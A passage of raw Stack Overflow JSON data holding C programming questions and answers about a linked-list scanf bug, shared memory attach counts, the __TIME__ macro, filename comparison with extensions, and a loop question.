"user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461796598, "post_id": 36902076, "comment_id": 61368353, "body": "I wouldn&#39;t expect it to, and that&#39;s not a reasonable initialization. Please review the code path your code will take... performing the initialization in your comment would delay the undefined behavior by one iteration but it just makes <code>head-&gt;next-&gt;next</code> uninitialized."}, {"owner": {"reputation": 23, "user_id": 3593630, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1849af391af3074b7281a13364dfa635?s=128&d=identicon&r=PG&f=1", "display_name": "Chythe", "link": "https://stackoverflow.com/users/3593630/chythe"}, "reply_to_user": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461796792, "post_id": 36902076, "comment_id": 61368426, "body": "gdb shows that there is literally no action being taken after the first integer is read from scanf. I have no idea what to do."}, {"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 1, "creation_date": 1461796901, "post_id": 36902076, "comment_id": 61368476, "body": "In <code>scanf(&quot;%d\\n&quot;</code> get rid of <code>\\n</code>. And initialize <code>head-&gt;next = NULL;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 3593630, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1849af391af3074b7281a13364dfa635?s=128&d=identicon&r=PG&f=1", "display_name": "Chythe", "link": "https://stackoverflow.com/users/3593630/chythe"}, "edited": false, "score": 0, "creation_date": 1461797677, "post_id": 36902281, "comment_id": 61368753, "body": "That worked, thanks! I didn&#39;t realize that \\n would delay the input."}, {"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461798836, "post_id": 36902281, "comment_id": 61369049, "body": "@EthanF it would seem that you&#39;ve taken these details directly from my comments. While I don&#39;t particularly care, attribution is expected when this happens. That said... the initialization of <code>head-&gt;next</code> should not occur until after it is known that <code>head != NULL</code>."}, {"owner": {"reputation": 251, "user_id": 6210960, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QD5L0.jpg?s=128&g=1", "display_name": "Ethan F.", "link": "https://stackoverflow.com/users/6210960/ethan-f"}, "reply_to_user": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461867888, "post_id": 36902281, "comment_id": 61406748, "body": "@mah Hi I am sorry you had such thought. This is not a hard question I really don&#39;t need to take details from others. I tested his code in my computer and both problems are very obvious. Yes you are right about the glitch in my code, it should be put after head null check. I&#39;ll make the change later, thank you for that. When I saw the problem during debugging I made this careless fix, probably in my mind, the chance of malloc returns NULL is almost impossible. Anyway, Hopefully no hard feelings."}, {"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461882977, "post_id": 36902281, "comment_id": 61414290, "body": "I agree it&#39;s not a difficult problem and I certainly don&#39;t mean to say you stole it from me! Its just that my comments were on this page several (7 I think) minutes before you posted the answer, and as you can see, not only is your answer virtually identical to my comments but you went as far as to call out the same unrelated requirement of initializing head-&gt;next... so perhaps you can see how the concern came about. No hard feelings at all."}, {"owner": {"reputation": 251, "user_id": 6210960, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QD5L0.jpg?s=128&g=1", "display_name": "Ethan F.", "link": "https://stackoverflow.com/users/6210960/ethan-f"}, "reply_to_user": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461883584, "post_id": 36902281, "comment_id": 61414484, "body": "@mah Yes I get your point. You found the problem (the next = NULL one) without running the code, you&#39;re cool :D."}], "tags": [], "owner": {"reputation": 251, "user_id": 6210960, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QD5L0.jpg?s=128&g=1", "display_name": "Ethan F.", "link": "https://stackoverflow.com/users/6210960/ethan-f"}, "is_accepted": false, "score": 1, "last_activity_date": 1461867984, "last_edit_date": 1461867984, "creation_date": 1461797270, "answer_id": 36902281, "question_id": 36902076, "link": "https://stackoverflow.com/questions/36902076/linked-list-not-adding-node-until-second-iteration/36902281#36902281", "title": "Linked list not adding node until second iteration", "body": "<p>Your code:</p>\n\n<pre><code>    if(scanf(\"%d\\n\",&amp;num) == 1) {\n</code></pre>\n\n<p>should be :</p>\n\n<pre><code>    if(scanf(\"%d\",&amp;num) == 1) {\n</code></pre>\n\n<p>And head needs to be initialized. </p>\n\n<pre><code>    node_t * head = malloc(sizeof(node_t));\n    if (head == NULL) {\n    return 1;\n}\nhead-&gt;next = NULL;\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 3593630, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1849af391af3074b7281a13364dfa635?s=128&d=identicon&r=PG&f=1", "display_name": "Chythe", "link": "https://stackoverflow.com/users/3593630/chythe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461867984, "creation_date": 1461796172, "last_edit_date": 1461796781, "question_id": 36902076, "link": "https://stackoverflow.com/questions/36902076/linked-list-not-adding-node-until-second-iteration", "title": "Linked list not adding node until second iteration", "body": "<p>I'm working on a FIFO page replacement algorithm and have it almost working. My code uses <code>scanf()</code> to read in a page number then it adds that item to a linked list, up to 16 pages. However, if the page already exists in the lined list, it does not add the page to this list again. There are three page frames (slots). Everything works properly, but, it does not add that item to the list until <code>scanf()</code> reads another integer to add to the list. I am utterly confused. </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\ntypedef struct node {\n    int num;\n    struct node * next;\n} node_t;\n\nvoid print_list(node_t * head) {\n    node_t * current = head;\n    while (current != NULL) {\n        printf(\"%d\\n\", current-&gt;num);\n        current = current-&gt;next;\n    }\n}\n\nint fault(node_t * head, int check) {\n    node_t * current = head;\n    while(current-&gt;next != NULL){\n        if(current-&gt;num == check)\n            return 0;\n        current = current-&gt;next;\n    }\n    return 1;\n}\n\nvoid addNode(node_t * head, int num) {\n    node_t * current = head;\n    while (current-&gt;next != NULL) {\n        current = current-&gt;next;\n    }\n\n    /* now we can add a new variable */\n    current-&gt;next = malloc(sizeof(node_t));\n    current-&gt;next-&gt;num = num;\n    current-&gt;next-&gt;next = NULL;\n}\n\nint pop(node_t ** head) {\n    int retnum = -1;\n    node_t * nextNode = NULL;\n    if (*head == NULL) {\n        return -1;\n    }\n    nextNode = (*head)-&gt;next;\n    retnum = (*head)-&gt;num;\n    free(*head);\n    *head = nextNode;\n    return retnum;\n}\n\n///////////////////////////////////////////////////////\n\nint main(){\n    int num;\n    int faults = 0;\n    int n = 0;\n    int j = 0;\n    node_t * head = malloc(sizeof(node_t));\n    if (head == NULL) {\n        return 1;\n    }\n    head-&gt;num = -1;\n    printf(\"Input page number up to 16 pages. Enter 'q' to quit.\\n\");\n    for(j=0;j&lt;16;j++){\n        if(scanf(\"%d\\n\",&amp;num) == 1) {\n\n            if (fault(head, num) == 1 &amp;&amp; n &lt; 3) {\n                n++;\n                faults++;\n                addNode(head, num);\n            }\n            else if (fault(head, num) == 1 &amp;&amp; n &gt;= 3) {\n                pop(&amp;head);\n                addNode(head,num);\n                faults++;\n            }   \n        }   \n        else{\n           int c = getchar();\n           if( c == 'q' ){\n               break;\n           }\n        }\n        if (n == 1 &amp;&amp; faults == 1)\n            pop(&amp;head);\n        printf(\"\\nPage Table:\\n\");\n        print_list(head);\n        printf(\"\\nInput page number: \\n\");\n    }\n    printf(\"Number of page faults: %d\\n\", faults);\n}\n</code></pre>\n\n<p>I ran it through gdb and it doesn't even call the addNode function until the second integer has been scanned. </p>\n\n<p>(And yes I know scanf is garbage, I just didn't want to bother learning how to do something else)</p>\n\n<p>Thanks for the help!</p>\n"}, {"tags": ["c", "shared-memory"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461796261, "post_id": 36902015, "comment_id": 61368229, "body": "Did you run <code>ipcs -m</code> while the process, which attached the shm segment, was still running?"}, {"owner": {"reputation": 1669, "user_id": 2036650, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/7f780c32382a9e1a96a367d362506359?s=128&d=identicon&r=PG", "display_name": "MidnightJava", "link": "https://stackoverflow.com/users/2036650/midnightjava"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461804520, "post_id": 36902015, "comment_id": 61370557, "body": "I ran <code>ipcs -m</code> after the process which attached had exited, but while the process which created the shared memory segment was still running. Specifically, the eclipse launcher creates the segment, with nattach = 0. While eclipse is still running, I run the C code to attach the segment. I&#39;m trying to work around this eclipse bug: <a href=\"https://bugs.eclipse.org/bugs/show_bug.cgi?id=492618\" rel=\"nofollow noreferrer\">bugs.eclipse.org/bugs/show_bug.cgi?id=492618</a>"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1461852763, "post_id": 36902015, "comment_id": 61396459, "body": "Then it works as expected: nattach is the number of processes with have the shm segment attached <i>at the moment</i>, this does not count past attaches, which were detached (either explicitly with shmdt or implicitly by terminating the process)."}, {"owner": {"reputation": 1669, "user_id": 2036650, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/7f780c32382a9e1a96a367d362506359?s=128&d=identicon&r=PG", "display_name": "MidnightJava", "link": "https://stackoverflow.com/users/2036650/midnightjava"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461860332, "post_id": 36902015, "comment_id": 61402104, "body": "Yes of course, I should have realized that. I&#39;m testing my C code separately now, so it exits. I put a 30-second sleep in before exiting, and natttach is incremented. I&#39;m going to invoke the C function via JNI from an eclipse RCP plug-in, in which case the nattach count will persist as needed until the eclipse app exits."}], "owner": {"reputation": 1669, "user_id": 2036650, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/7f780c32382a9e1a96a367d362506359?s=128&d=identicon&r=PG", "display_name": "MidnightJava", "link": "https://stackoverflow.com/users/2036650/midnightjava"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 246, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1461795888, "creation_date": 1461795888, "question_id": 36902015, "link": "https://stackoverflow.com/questions/36902015/shared-memory-shmat-call-is-successful-but-does-not-increment-nattach", "title": "Shared Memory: shmat() call is successful but does not increment nattach", "body": "<p>I'm trying to attach an existing shared memory segment, but the nattach value does not increment, as indicated in the api for <code>shmat</code>.</p>\n\n<p>My code:</p>\n\n<pre><code>#include  &lt;stdio.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/errno.h&gt;\n\nvoid attachSharedMem(char* shm_id) {\n    printf(\"Attach shared mem ID %s \", shm_id);\n    void* res;\n    res = shmat(atoi(shm_id), NULL, 0);\n    printf(\"\\nAttach result %p\", res);\n    printf(\"\\nError %d\", errno);\n}\n</code></pre>\n\n<p>The results:</p>\n\n<pre><code>Attach shared mem ID 112590871 \nAttach result 0x7f63df61e000\nError 0\n</code></pre>\n\n<p>But running <code>ipcs -m</code> shows <code>nattach</code> is still 0 for shmid 112590871</p>\n\n<p>If I pass a bogus shmid it returns -1 and sets errno to 22, so it seems the call with the valid shmid is successful. Successive calls return a different address, so I think I'm attaching the segment to multiple locations, but nattach never increments.</p>\n"}, {"tags": ["c", "macros", "c-preprocessor"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461795916, "post_id": 36901990, "comment_id": 61368099, "body": "See 6.10.8.1p1 It very likely means when the preprocessing <i>starts</i>. Anything else would be pretty useless."}, {"owner": {"reputation": 4565, "user_id": 1134885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c428466054762cf7d4b5fb5f4396fa2?s=128&d=identicon&r=PG", "display_name": "NovaDenizen", "link": "https://stackoverflow.com/users/1134885/novadenizen"}, "edited": false, "score": 1, "creation_date": 1461799733, "post_id": 36901990, "comment_id": 61369314, "body": "I think the current version of GNU CPP establishes values for<code>__TIME__</code> and <code>__DATE__</code> at the same time, at the time either macro is first expanded.  I&#39;m not 100% sure, but the scope of a particular set of values for these macros appears to be the allocated while the command line options are parsed, so essentially once per invocation.  GCC source is notoriously convoluted."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 4565, "user_id": 1134885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c428466054762cf7d4b5fb5f4396fa2?s=128&d=identicon&r=PG", "display_name": "NovaDenizen", "link": "https://stackoverflow.com/users/1134885/novadenizen"}, "edited": false, "score": 0, "creation_date": 1461807118, "post_id": 36901990, "comment_id": 61371235, "body": "@NovaDenizen  a need for simultaneity of <code>__DATE__</code> and <code>__TIME__</code> is an excellent point!  Imagine if these 2 were not set at the same instant.  Else with a <code>__TIME__</code> of <code>00:00:00</code> the <code>__DATE__</code> could be yesterday or today.  The only sane functionality is a one-time setting of both values."}, {"owner": {"reputation": 6975, "user_id": 274579, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/745415fffcdea46caf03c90534a4c7fa?s=128&d=identicon&r=PG", "display_name": "ysap", "link": "https://stackoverflow.com/users/274579/ysap"}, "edited": false, "score": 0, "creation_date": 1541551385, "post_id": 36901990, "comment_id": 93254453, "body": "An extension of this question (or its consequences thereof) - in a multi-module project, compilation of modules may expand over a long period of time. If these macros appear in multiple modules, then the generated expansions are not in sync, even if it is guaranteed in a <i>specific</i> module."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461796866, "post_id": 36902152, "comment_id": 61368455, "body": "I doubt there is a de facto standard, yet that is only an opinion.  Yet I agree with <a href=\"http://stackoverflow.com/questions/36901990/is-time-preprocessor-macro-guaranteed-to-be-constant-within-a-file/36902152#comment61368099_36901990\">@Olaf</a> that a single occurrence is reasonable.  Now the question is what is the use case where it makes a difference?"}, {"owner": {"reputation": 1874, "user_id": 1651000, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/be6ee9bebde05dc29f6232407088a939?s=128&d=identicon&r=PG", "display_name": "marack", "link": "https://stackoverflow.com/users/1651000/marack"}, "edited": false, "score": 0, "creation_date": 1461799065, "post_id": 36902152, "comment_id": 61369127, "body": "No use case that I can think of... just a curiosity."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 5, "last_activity_date": 1461796525, "creation_date": 1461796525, "answer_id": 36902152, "question_id": 36901990, "link": "https://stackoverflow.com/questions/36901990/is-time-preprocessor-macro-guaranteed-to-be-constant-within-a-file/36902152#36902152", "title": "Is __TIME__ preprocessor macro guaranteed to be constant within a file?", "body": "<p>C does not rigorously specify the the \" time of translation\" is constant throughout a pre-processing/compilation.</p>\n\n<p>My experience has been it is constant.  But since it is only to the second, a given compilation would need to cross a second boundary to differ.</p>\n\n<blockquote>\n  <p><code>__TIME__</code> The time of translation of the preprocessing translation unit: a character string literal of the form <code>\"hh:mm:ss\"</code> as in the time generated by the\n  <code>asctime</code> function. If the time of translation is not available, an\n  implementation-defined valid time shall be supplied. C11 \u00a76.10.8.1 1</p>\n  \n  <p>The definitions for <code>__DATE__</code> and <code>__TIME__</code> when respectively, the date and\n  time of translation are not available (6.10.8.1).  (Informative) C11 \u00a7J.3.11 1</p>\n</blockquote>\n"}], "owner": {"reputation": 1874, "user_id": 1651000, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/be6ee9bebde05dc29f6232407088a939?s=128&d=identicon&r=PG", "display_name": "marack", "link": "https://stackoverflow.com/users/1651000/marack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 487, "favorite_count": 0, "accepted_answer_id": 36902152, "answer_count": 1, "score": 9, "last_activity_date": 1461796525, "creation_date": 1461795737, "question_id": 36901990, "link": "https://stackoverflow.com/questions/36901990/is-time-preprocessor-macro-guaranteed-to-be-constant-within-a-file", "title": "Is __TIME__ preprocessor macro guaranteed to be constant within a file?", "body": "<p>Just out of curiosity I am wondering whether the value given by the standard <code>__TIME__</code> preprocessor macro can change within a single translation unit?</p>\n\n<p>In other words, is <code>__TIME__</code> determined once during preprocessing and then fixed, or is it re-evaluated each time it is encountered?</p>\n\n<p>If this is not specified by the C standard, is there a de facto standard behavior among the major implementations (gnu, clang, intel, msvc)?</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 357, "user_id": 3157237, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b7aecb2ea935f05442f759ac9e39b52?s=128&d=identicon&r=PG", "display_name": "Nidrax", "link": "https://stackoverflow.com/users/3157237/nidrax"}, "edited": false, "score": 0, "creation_date": 1461795673, "post_id": 36901946, "comment_id": 61367998, "body": "And I know, I can use strstr, but I want the substring to be found specifically between a slash &#39;/&#39; and (if it exists) a dot &#39;.&#39;"}, {"owner": {"reputation": 1501, "user_id": 5427063, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-8dAoViSoxvk/AAAAAAAAAAI/AAAAAAAAA60/8VcZHPeu1vw/photo.jpg?sz=128", "display_name": "Tah", "link": "https://stackoverflow.com/users/5427063/tah"}, "edited": false, "score": 2, "creation_date": 1461795727, "post_id": 36901946, "comment_id": 61368014, "body": "Do you have more examples of both the inputs, comparisons and the expected output?"}, {"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 0, "creation_date": 1461795771, "post_id": 36901946, "comment_id": 61368032, "body": "you can try strcmp"}, {"owner": {"reputation": 357, "user_id": 3157237, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b7aecb2ea935f05442f759ac9e39b52?s=128&d=identicon&r=PG", "display_name": "Nidrax", "link": "https://stackoverflow.com/users/3157237/nidrax"}, "reply_to_user": {"reputation": 1501, "user_id": 5427063, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-8dAoViSoxvk/AAAAAAAAAAI/AAAAAAAAA60/8VcZHPeu1vw/photo.jpg?sz=128", "display_name": "Tah", "link": "https://stackoverflow.com/users/5427063/tah"}, "edited": false, "score": 0, "creation_date": 1461796123, "post_id": 36901946, "comment_id": 61368172, "body": "@TahTatsumoto I don&#39;t think the problem requires more examples. In short I am doing someting similar to pidof by reading symbolic links from /proc subfolders, so I want to find the process despite of the file having an extension, so &quot;bash&quot; would be true for &quot;/bin/bash&quot; but also &quot;vim&quot; would be true for &quot;/usr/bin/vim.basic&quot;."}, {"owner": {"reputation": 357, "user_id": 3157237, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b7aecb2ea935f05442f759ac9e39b52?s=128&d=identicon&r=PG", "display_name": "Nidrax", "link": "https://stackoverflow.com/users/3157237/nidrax"}, "reply_to_user": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 1, "creation_date": 1461796187, "post_id": 36901946, "comment_id": 61368199, "body": "@Lashane you comment doesn&#39;t help at all, because I actually use strcmp... My problem is how to use it to achieve the effect I want."}, {"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 1, "creation_date": 1461796248, "post_id": 36901946, "comment_id": 61368221, "body": "@Nidrax I mean strNcmp, sorry for typo"}, {"owner": {"reputation": 357, "user_id": 3157237, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b7aecb2ea935f05442f759ac9e39b52?s=128&d=identicon&r=PG", "display_name": "Nidrax", "link": "https://stackoverflow.com/users/3157237/nidrax"}, "reply_to_user": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 0, "creation_date": 1461796329, "post_id": 36901946, "comment_id": 61368252, "body": "@Lashane, oh, now it looks more promising. Thanks :)"}], "answers": [{"tags": [], "owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "is_accepted": true, "score": 1, "last_activity_date": 1461796466, "creation_date": 1461796466, "answer_id": 36902138, "question_id": 36901946, "link": "https://stackoverflow.com/questions/36901946/compare-filename-with-optional-file-extension/36902138#36902138", "title": "Compare filename with optional file extension", "body": "<p>It takes <code>strncmp</code> and some additional calculation and checks.</p>\n\n<p>Note that your code is off by 1 at this point:</p>\n\n<pre><code>if (slash &amp;&amp; !strcmp(slash, name))\n</code></pre>\n\n<p>.. <code>slash</code> will point <em>to the slash</em>, so unless you accounted for that in <code>name</code>, it will always fail.</p>\n\n<p>This code works:</p>\n\n<pre><code>if (slash &amp;&amp;\n    !strncmp(slash+1, name, strlen(name)) &amp;&amp;\n    (!slash[1+strlen(name)] || slash[1+strlen(name)] == '.'))\n{\n    printf(\"FOUND!\\n\");\n}\n</code></pre>\n\n<p>It checks if the first <em>n</em> characters at <code>slash+1</code> are equal to <code>name</code> with the <em>length</em> of <code>name</code> \u2013 thus, it checks the <code>vim</code> in <code>etc/vim.basic</code> \u2013 and then checks if <code>name</code> is immediately followed by a <code>0</code> end-of string <em>or</em> by a <code>.</code> character.</p>\n\n<p>It's slightly easier on the eyes if you can modify <code>procname</code>:</p>\n\n<pre><code>if (slash)\n{\n    char *dot = strchr (slash, '.');\n    if (dot) *dot = 0;\n    if (!strcmp(slash+1, name))\n    {\n        printf(\"FOUND!\\n\");\n    }\n}\n</code></pre>\n\n<p>(Will not work if <code>procname</code> cannot be changed, as in <code>char *procname = \"..\"</code>. OTOH if it can, you could even restore the original string by adding</p>\n\n<pre><code>if (dot) *dot = '.';\n</code></pre>\n\n<p>at the end.)</p>\n"}], "owner": {"reputation": 357, "user_id": 3157237, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b7aecb2ea935f05442f759ac9e39b52?s=128&d=identicon&r=PG", "display_name": "Nidrax", "link": "https://stackoverflow.com/users/3157237/nidrax"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 36902138, "answer_count": 1, "score": -1, "last_activity_date": 1461797851, "creation_date": 1461795525, "last_edit_date": 1461797851, "question_id": 36901946, "link": "https://stackoverflow.com/questions/36901946/compare-filename-with-optional-file-extension", "title": "Compare filename with optional file extension", "body": "<p>I need to check if a path stored in a string is actually a path to a file whose name I have stored in another string.</p>\n\n<p>eg.: let's suppose I have a file at /etc/prog/myprog</p>\n\n<p>I have this kind of function:</p>\n\n<pre><code>char *slash = strrchr(procname, '/');\nif(slash &amp;&amp; !strcmp(slash, name)){\n    printf(\"FOUND!\\n\");\n}\n</code></pre>\n\n<p>And it works fine when looking for \"myprog\", but it obviously doesn't work if the file has an extension (for example if strings ends with \"/vim.basic\" I want the if statement to be true when looking for \"vim\").</p>\n\n<p>I guess I have to use strrchr to find the position of dot and if it exist, stop comparison at that char, but I have no idea how to construct the conditional statement to work this way.</p>\n"}, {"tags": ["c", "iar"], "comments": [{"owner": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 1, "creation_date": 1461794814, "post_id": 36901747, "comment_id": 61367641, "body": "In the first one, you aren&#39;t comparing your <code>i--</code> to anything, to match the second one, shouldn&#39;t it be <code>while(i-- &gt; 0 &amp;&amp; !Ready)</code>?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 1, "creation_date": 1461794842, "post_id": 36901747, "comment_id": 61367660, "body": "@gmiley eh? isn&#39;t is implied?"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 3, "creation_date": 1461794889, "post_id": 36901747, "comment_id": 61367676, "body": "@gmiley: no. As far as the <code>while</code> is concerned, <code>i--</code> evaluates to either <code>true</code> (when <code>i != 0</code>) or <code>false</code> (when <code>i = 0</code>) \u2013 both checked before the actual decrement."}, {"owner": {"reputation": 6171, "user_id": 3885008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2w1Vd.png?s=128&g=1", "display_name": "gmiley", "link": "https://stackoverflow.com/users/3885008/gmiley"}, "edited": false, "score": 0, "creation_date": 1461794910, "post_id": 36901747, "comment_id": 61367684, "body": "Why would it be? All <code>i--</code> does is decrement the <code>i</code> variable by 1."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 4, "creation_date": 1461794912, "post_id": 36901747, "comment_id": 61367685, "body": "a <code>do</code> loop is always executed at least once .. are you saying you&#39;re not even getting a single <code>Task_sleep()</code> with the first 